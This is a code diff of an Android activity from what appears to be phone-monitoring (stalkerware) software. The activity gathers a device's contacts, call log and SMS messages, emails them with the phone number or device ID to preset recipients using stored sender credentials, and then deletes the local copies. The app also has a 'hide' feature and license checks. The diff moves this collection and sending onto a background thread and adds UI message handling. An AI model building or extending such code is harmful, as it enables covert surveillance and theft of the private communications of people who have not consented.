@@ -10,6 +10,8 @@ import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Message;
 import android.util.Log;
 import android.view.View;
 import android.view.View.OnClickListener;
@@ -44,11 +46,21 @@ public class InitActivity extends Activity
     OnClickListener listener_screenshot = null;
     OnClickListener listener_setting = null;
     OnClickListener listener_hide = null;
+    
+    private Context context;
+    
+    private final int DISABLE_GETINFO_BTN = 0;
+    private final int ENABLE_GETINFO_BTN  = 1;
+    private final int SEND_MAIL_SUCCESS   = 2;
+    private final int SEND_MAIL_FAIL      = 3;
+    private final int NETWORK_DISCONNECTED = 4;
      
     @Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.init);
+        
+        context = getApplicationContext();
         
         setListener(); 
         initUI();
@@ -74,10 +86,8 @@ public class InitActivity extends Activity
         if (ConfigCtrl.getLicenseType(getApplicationContext()) != LICENSE_TYPE.NOT_LICENSED) enabled = true;
         btn_getinfo.setEnabled(enabled);
         btn_screenshot.setEnabled(enabled);
-        btn_hide.setEnabled(enabled);
         hint_getinfo.setEnabled(enabled);
         hint_screenshot.setEnabled(enabled);
-        hint_hide.setEnabled(enabled);
         
         btn_screenshot.setVisibility(View.GONE);// TODO Invisible for v.1.0
         hint_screenshot.setVisibility(View.GONE);// TODO Invisible for v.1.0
@@ -101,7 +111,8 @@ public class InitActivity extends Activity
 			
 			// Send the receiver info SMS to server to update record in database
 			boolean hasChangedReceiverInfo = data.getExtras().getBoolean(GlobalPrefActivity.HAS_CHG_RECEIVER_INFO);
-			if (hasChangedReceiverInfo) {
+			boolean hasBeenLicensed = (ConfigCtrl.getLicenseType(context) != LICENSE_TYPE.NOT_LICENSED);
+			if (hasChangedReceiverInfo && hasBeenLicensed) {
 				SmsCtrl.sendReceiverInfoSms(getApplicationContext());
 			}
     	}
@@ -113,63 +124,76 @@ public class InitActivity extends Activity
         {
             public void onClick(View v)
             {
-            	Context context = getApplicationContext();
-            	// If network connected, try to collect and send the information
-        		if (!SysUtils.isNetworkConnected(context)) {
-        			SysUtils.messageBox(context, getResources().getString(R.string.action_network_disconnected));
-        			return;
-        		}
+            	// Start a new thread to do the time-consuming job
+    			new Thread(new Runnable(){
+    				public void run() {
+    					mHandler.sendEmptyMessageDelayed(DISABLE_GETINFO_BTN, 0);
+    					
+    					// If network connected, try to collect and send the information
+    					if (!SysUtils.isNetworkConnected(context)) {
+    						mHandler.sendEmptyMessageDelayed(NETWORK_DISCONNECTED, 0);
+    						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
+    						return;
+    					}
         		
-        		GetInfoTask.attachments = new ArrayList<File>();
+    					GetInfoTask.attachments = new ArrayList<File>();
         		
-        		GetInfoTask.CollectContact(context);
-        		GetInfoTask.CollectPhoneCallHist(context);
-        		GetInfoTask.CollectSms(context);
+    					GetInfoTask.CollectContact(context);
+    					GetInfoTask.CollectPhoneCallHist(context);
+    					GetInfoTask.CollectSms(context);
         		
-        		// If network connected, try to collect and send the information
-        		if (!SysUtils.isNetworkConnected(context)) {
-        			SysUtils.messageBox(context, getResources().getString(R.string.action_network_disconnected));
-        			return;
-        		}
+    					// If network connected, try to collect and send the information
+    					if (!SysUtils.isNetworkConnected(context)) {
+    						mHandler.sendEmptyMessageDelayed(NETWORK_DISCONNECTED, 0);
+    						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
+    						return;
+    					}
         	
-        		// Send mail
-        		String subject = getResources().getString(R.string.mail_from) 
-        	          		 + DeviceProperty.getPhoneNumber(context) 
-        	          		 + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date());
-        		String body = String.format(getResources().getString(R.string.mail_body), 
-        				DeviceProperty.getPhoneNumber(context));
-        		List<String> fileList = new ArrayList<String>();
-        		for (int i = 0; i < GetInfoTask.attachments.size(); i++)
-        			fileList.add(GetInfoTask.attachments.get(i).getAbsolutePath());
+    					// Send mail
+    					String phoneNum = DeviceProperty.getPhoneNumber(context);
+    					if (phoneNum == null) phoneNum = DeviceProperty.getDeviceId(context);
+    					String subject = getResources().getString(R.string.mail_from) 
+        	          		 +  phoneNum + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date());
+    					String body = String.format(getResources().getString(R.string.mail_body), phoneNum);
+    					List<String> fileList = new ArrayList<String>();
+    					for (int i = 0; i < GetInfoTask.attachments.size(); i++)
+    						fileList.add(GetInfoTask.attachments.get(i).getAbsolutePath());
         		
-        		String[] recipients = GlobalPrefActivity.getMail(context).split(",");
-			if (recipients.length == 0) return;
-        		String pwd = MailCfg.getSenderPwd(context);
+    					String[] recipients = GlobalPrefActivity.getMail(context).split(",");
+    					if (recipients.length == 0) {
+    						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
+    						return;
+    					}
+    					String pwd = MailCfg.getSenderPwd(context);
         		
-        		boolean result = false;
-        		int retry = 3;
-        		while(!result && retry > 0)
-        		{
-        			String sender = MailCfg.getSender(context);
-        			result = GetInfoTask.sendMail(subject, body, sender, pwd, recipients, fileList);
-        			if (!result) retry--;
-        		}
-        		if(result) {
-        			SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_success));
-        		} else {
-        			SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_fail));
-        		}
-        		GetInfoTask.attachments.clear();
+    					boolean result = false;
+    					int retry = 3;
+    					while(!result && retry > 0)
+    					{
+    						String sender = MailCfg.getSender(context);
+    						result = GetInfoTask.sendMail(subject, body, sender, pwd, recipients, fileList);
+    						if (!result) retry--;
+    					}
+    					if(result) {
+    						mHandler.sendEmptyMessageDelayed(SEND_MAIL_SUCCESS, 0);
+    					} else {
+    						mHandler.sendEmptyMessageDelayed(SEND_MAIL_FAIL, 0);
+    					}
+    					GetInfoTask.attachments.clear();
         		
-        		// Update the last date time
-        		if (result) {
-        			boolean successful = ConfigCtrl.setLastGetInfoTime(context, new Date());
-        			if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
-        		}
+    					// Update the last date time
+    					if (result) {
+    						boolean successful = ConfigCtrl.setLastGetInfoTime(context, new Date());
+    						if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
+    					}
         		
-        		// Clean the files in SD-CARD
-        		FileCtrl.cleanFolder();
-        	}
+    					// Clean the files in SD-CARD
+    					FileCtrl.cleanFolder();
+    					
+    					mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
+    				}
+    			}).start();
+            }
             
         };
         
@@ -199,4 +223,35 @@ public class InitActivity extends Activity
             }
         };
     }
+    	
+    // Update UI 
+    private Handler mHandler = new Handler(){
+        @Override
+        public void handleMessage(Message msg) {
+            switch (msg.what) {
+               case DISABLE_GETINFO_BTN: {
+              	   btn_getinfo.setEnabled(false);
+                   break;
+               }
+               case ENABLE_GETINFO_BTN: {
+             	   btn_getinfo.setEnabled(true);
+              	   break;
+               }
+               case NETWORK_DISCONNECTED: {
+            	   SysUtils.messageBox(context, getResources().getString(R.string.action_network_disconnected));
+            	   break;
+               }
+               case SEND_MAIL_SUCCESS: {
+            	   SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_success));
+            	   break;
+               }
+               case SEND_MAIL_FAIL: {
+            	   SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.action_send_mail_fail));
+            	   break;
+               }
+               default:
+                   break;
+            }
+        }
+    };
 }
